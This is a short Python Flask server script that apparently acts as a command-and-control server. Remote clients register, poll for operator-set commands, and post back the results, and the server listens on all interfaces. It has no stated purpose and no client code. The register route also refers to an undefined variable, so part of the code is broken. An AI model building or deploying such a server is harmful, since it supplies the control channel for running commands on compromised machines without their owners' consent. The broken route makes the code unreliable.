# SERVER.py
from flask import Flask, request

app = Flask(__name__)
commands = {}

@app.route('/register/<client_id>', methods=['GET'])
def register(client_id):
  command[client_id] = ""
  return "Registered"


@app.route('/get_command/<client_id>', methods=['GET'])
def get_command(client_id):
  return commands.get(client_id, "")

@app.route('/send_result/<client_id>', methods=['POST'])
def receive_result(client_id):
  print(f"[{client_id}] Result: {request.data.decode()}")
  return "OK"

@app.route('/set_command/<client_id>', methods=['POST'])
def set_command(client_id):
  commands[client_id] = request.data.decode()
  return "command Set"

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=5000)
